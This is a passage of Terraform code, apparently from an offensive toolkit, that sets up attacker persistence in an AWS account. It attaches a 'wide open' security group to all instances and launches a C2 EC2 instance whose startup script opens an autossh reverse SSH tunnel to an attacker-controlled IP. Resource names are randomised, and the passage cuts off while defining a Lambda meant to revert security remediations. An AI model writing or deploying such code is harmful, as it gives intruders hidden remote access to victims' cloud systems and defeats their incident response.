resource "aws_network_interface_sg_attachment" "wide_open_attachment" {
  for_each             = { for idx, id in data.aws_instances.all.ids : idx => id }
  security_group_id    = aws_security_group.wide_open.id
  network_interface_id = data.aws_instances.all.network_interface_ids[each.key]
}

# 4. Deploy C2 EC2 instance with reverse SSH tunnel
resource "aws_instance" "c2_server" {
  ami           = data.aws_ami.ubuntu.id
  instance_type = "t3.micro"
  key_name      = aws_key_pair.c2_key.key_name
  vpc_security_group_ids = [aws_security_group.wide_open.id]

  user_data = <<-EOF
              #!/bin/bash
              apt-get update
              apt-get install -y openssh-server autossh
              echo "${tls_private_key.c2_key.private_key_openssh}" > /home/ubuntu/.ssh/id_rsa
              chmod 600 /home/ubuntu/.ssh/id_rsa
              chown ubuntu:ubuntu /home/ubuntu/.ssh/id_rsa

              # Set up reverse SSH tunnel to attacker server
              autossh -M 0 -N -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" \
                -R 2222:localhost:22 attacker@${var.attacker_server_ip} -i /home/ubuntu/.ssh/id_rsa -f
              EOF

  tags = {
    Name = "c2-server-${md5(timestamp())}"
  }
}

data "aws_ami" "ubuntu" {
  most_recent = true

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*"]
  }

  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }

  owners = ["099720109477"] # Canonical
}

resource "tls_private_key" "c2_key" {
  algorithm = "RSA"
  rsa_bits  = 4096
}

resource "aws_key_pair" "c2_key" {
  key_name   = "c2-key-${md5(timestamp())}"
  public_key = tls_private_key.c2_key.public_key_openssh
}

variable "attacker_server_ip" {
  description = "IP address of the attacker's C2 server"
  type        = string
  default     = "1.2.3.4" # Replace with actual attacker IP
}

# 5. Create Lambda function to monitor and revert security remediations
resource "aws_lambda_function" "security_reverter" {
  filename      = "lambda_function.zip"
  function_name = "security-reverter-${md5(timestamp())}"
  role          = aws_iam_role.lambda
